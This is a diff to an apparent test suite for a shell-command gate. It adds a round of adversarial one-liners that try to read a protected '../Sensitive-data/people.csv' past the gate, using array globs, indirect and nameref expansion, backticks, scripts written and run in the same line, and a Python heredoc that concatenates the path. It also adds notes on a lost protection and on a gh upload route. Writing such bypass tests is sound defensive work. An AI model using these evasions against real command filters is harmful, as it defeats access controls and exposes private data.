@@ -324,6 +324,25 @@ CASES: list[Adv] = [
     _c("R6", "script-cp-then-run", "echo 'cat ../S*/p*' > w3.sh; cp w3.sh w4.sh; bash w4.sh"),
     _c("R6", "script-symlink-then-run", "ln -s hook w5.sh; bash w5.sh"),
     _c("R6", "script-exact-name-glob-inside", "echo 'cat ../S*/p*' > w6.sh; bash w6.sh"),
+    # R8 — round 8: monotonicity (every word of an assignment is judged as before) and a file written in the line and run in it
+    _c("R8", "array-then-scalar-then-use", "a=(../S*/p*); b=${a[@]}; cat $b"),
+    _c("R8", "array-quoted-star", 'a=(../S*/p*); b="${a[*]}"; cat $b'),
+    _c("R8", "array-as-scalar", 'a=(../S*/p*); b="$a"; cat $b'),
+    _c("R8", "array-slice-scalar", "a=(../S*/p*); b=${a[@]:1}; cat $b"),
+    _c("R8", "array-local-copy", "f() { a=(../S*/p*); local b=${a[@]}; cat $b; }; f"),
+    _c("R8", "array-copy-chain", "a=(../S*/p*); b=${a[@]}; c=$b; cat $c"),
+    _c("R8", "array-copy-cd", "a=(../Sens*); b=${a[@]}; cd $b; cat people.csv"),
+    _c("R8", "array-copy-dir", "a=(../Sens*); b=${a[@]}; cat $b/people.csv"),
+    _c("R8", "indirect-p-flag", "a=(../S*/p*); n=a; cat ${(P)n}"),
+    _c("R8", "indirect-p-nested", "a=(../S*/p*); cat ${(P)${:-a}}"),
+    _c("R8", "indirect-bang", "a=(../S*/p*); n=a; cat ${!n}"),
+    _c("R8", "indirect-bang-array", "a=(../S*/p*); n='a[@]'; cat ${!n}"),
+    _c("R8", "nameref", "a=(../S*/p*); declare -n r=a; cat ${r[@]}"),
+    _c("R8", "backtick-element", "a=(`echo ../S*/p*`); cat ${a[@]}"),
+    _c("R8", "backtick-assignment", "b=`echo ../S*/p*`; cat $b"),
+    _c("R8", "echo-script-by-variable", 'd=$PWD; echo "cd $d; cat ../S*/p*" > w8.sh; bash w8.sh'),
+    _c("R8", "echo-script-tmpdir", "T=${TMPDIR:-.}; echo 'cd '$PWD'; cat ../S*/p*' > $T/w9.sh; bash $T/w9.sh"),
+    _c("R8", "python-script-concatenated-name", "S=x8.py; cat > $S <<'EOF'\nprint(open('../'+'Sens'+'itive-data/people.csv').read())\nEOF\npython3 $S"),
     # B — benign lines (nothing is read): what the new rules cost in false alarms
     _c("B", "variable-with-spaces", "D=\"a b\"; cat \"$D\""),
     _c("B", "cd-known-variable", "D=sub; cd \"$D\" && cat notes.md"),
@@ -415,6 +434,10 @@ NOREAD = {
 }
 
 KNOWN: dict[str, str] = {
+    "python-script-concatenated-name": "`S=x.py; cat > $S <<'EOF' … 'Sens'+'itive' … EOF; python3 $S`: the old gate denied it only through "
+    "the accident `_unvettable_script` (a `$` in the target name of a written script that is run in the line). The AST gate resolves `$S` and judges the "
+    "body as text, and the body assembles the path at run time (string concatenation) — a text no rule reads as a path. A LOST ACCIDENTAL "
+    "PROTECTION. README: covered (\"code that assembles a path at run time\", \"a script written earlier\")",
     "gh-body-file-substitution": "`gh issue create --body-file \"$(echo ../S*/p*.csv)\"`: not run for real (gh talks to the network). The value is the OUTPUT of "
     "a substitution, judged as text (the glob sits inside `echo`). README: covered (issue #22); NOT measured by `real`",
     "gh-F-variable": "`gh … -F \"$f\"`: the value of `$f` is not in the line (judged as text), gh uploads that file; not run for real. README: NOT covered "
